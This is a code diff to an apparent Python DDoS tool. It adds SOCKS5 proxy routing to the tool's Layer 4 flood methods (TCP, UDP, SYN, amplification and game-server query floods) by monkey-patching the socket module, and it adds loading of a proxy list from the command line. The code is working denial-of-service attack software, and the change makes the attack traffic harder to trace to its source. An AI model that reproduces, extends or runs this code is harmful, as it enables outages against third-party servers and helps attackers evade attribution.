@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+import socks
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -7,6 +9,7 @@ from json import load
 from logging import getLogger, shutdown, basicConfig
 from math import trunc, log2
 from multiprocessing import RawValue
+from urllib.parse import urlparse
 from os import urandom as randbytes
 from pathlib import Path
 from random import randint, choice as randchoice
@@ -18,7 +21,6 @@ from threading import Thread, Event, Lock
 from time import sleep, time
 from typing import Set, List, Any, Tuple
 from urllib import parse
-
 from PyRoxy import Proxy, Tools as ProxyTools, ProxyUtiles, ProxyType, ProxyChecker
 from certifi import where
 from cfscrape import create_scraper
@@ -88,6 +90,11 @@ class Counter(object):
 requests_sent = Counter()
 bytes_sent = Counter()
 
+def create_connection(address, timeout=None, source_address=None):
+    sock = socks.socksocket()
+    sock.connect(address)
+    return sock
+
 
 class Tools:
     @staticmethod
@@ -126,11 +133,13 @@ class Layer4(Thread):
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
+    _proxies: List[Proxy] = None
 
     def __init__(self, target: Tuple[str, int],
                  ref: List[str] = None,
                  method: str = "TCP",
-                 synevent: Event = None):
+                 synevent: Event = None,
+                 proxies: Set[Proxy] = None):
         super().__init__(daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -138,6 +147,8 @@ class Layer4(Thread):
         self._method = method
         self._target = target
         self._synevent = synevent
+        if proxies:
+            self._proxies = list(proxies)
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -146,6 +157,21 @@ class Layer4(Thread):
             with suppress(Exception):
                 while self._synevent.is_set():
                     self.SENT_FLOOD()
+
+    def get_effective_socket(self,conn_type = AF_INET,sock_type = SOCK_STREAM, proto_type = IPPROTO_TCP):
+        if self._proxies:
+            rand_proxy = randchoice(self._proxies)
+            parsed_proxy = urlparse(str(rand_proxy))
+            hostname = parsed_proxy.hostname
+            port = parsed_proxy.port
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, hostname, port)
+            # patch the socket module
+            socket.socket = socks.socksocket
+            socket.create_connection = create_connection
+            s = socks.socksocket(conn_type, sock_type, proto_type)
+            return s
+        else:
+            return socket(conn_type, sock_type,proto_type)
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -182,7 +208,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         global bytes_sent, requests_sent
         try:
-            with socket(AF_INET, SOCK_STREAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
@@ -195,7 +221,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
         try:
-            with socket(AF_INET, SOCK_STREAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
 
@@ -213,7 +239,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         global bytes_sent, requests_sent
         try:
-            with socket(AF_INET, SOCK_DGRAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
                     requests_sent += 1
                     bytes_sent += 1024
@@ -225,7 +251,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = self._genrate_syn()
         try:
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
                     requests_sent += 1
@@ -238,7 +264,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = next(self._amp_payloads)
         try:
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     requests_sent += 1
@@ -252,7 +278,7 @@ class Layer4(Thread):
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
         try:
-            with socket(AF_INET, SOCK_DGRAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(payload, self._target):
                     requests_sent += 1
                     bytes_sent += len(payload)
@@ -993,7 +1019,7 @@ class ToolsConsole:
                '\n'
                'Example:\n'
                '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-               '    Layer4: python3 %s %s %s %s %s') % (argv[0], argv[0],
+               '    Layer4: python3 %s %s %s %s %s proxy.txt') % (argv[0], argv[0],
                                                         ", ".join(Methods.LAYER4_METHODS),
                                                         len(Methods.LAYER4_METHODS),
                                                         ", ".join(Methods.LAYER7_METHODS),
@@ -1021,7 +1047,6 @@ class ToolsConsole:
         with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
             return s.json()
         return {"success": False}
-
 
 if __name__ == '__main__':
     with open(__dir__ / "config.json") as f:
@@ -1114,7 +1139,16 @@ if __name__ == '__main__':
                         logger.warning("Port Not Selected, Set To Default: 80")
                     else:
                         target = target.split(":")[0]
-
+                    proxy_ty = int(argv[6].strip())
+                    proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
+                    proxies = None
+                    if proxy_li.exists():
+                        proxies = ProxyUtiles.readIPPortFromFile(proxy_li)
+                    if not proxies:
+                        logger.info("Empty Proxy File, Running layer 4 witout proxy")
+                        proxies = None
+                    if proxies:
+                        logger.info(f"Proxy Count: {len(proxies):,}")
                     if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                     if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
@@ -1133,7 +1167,7 @@ if __name__ == '__main__':
                             logger.setLevel("DEBUG")
 
                     for _ in range(threads):
-                        Layer4((target, port), ref, method, event).start()
+                        Layer4((target, port), ref, method, event,proxies).start()
 
                 logger.info("Attack Started to %s with %s method for %s seconds, threads: %d!" %
                             (target or url.human_repr(), method, timer, threads))
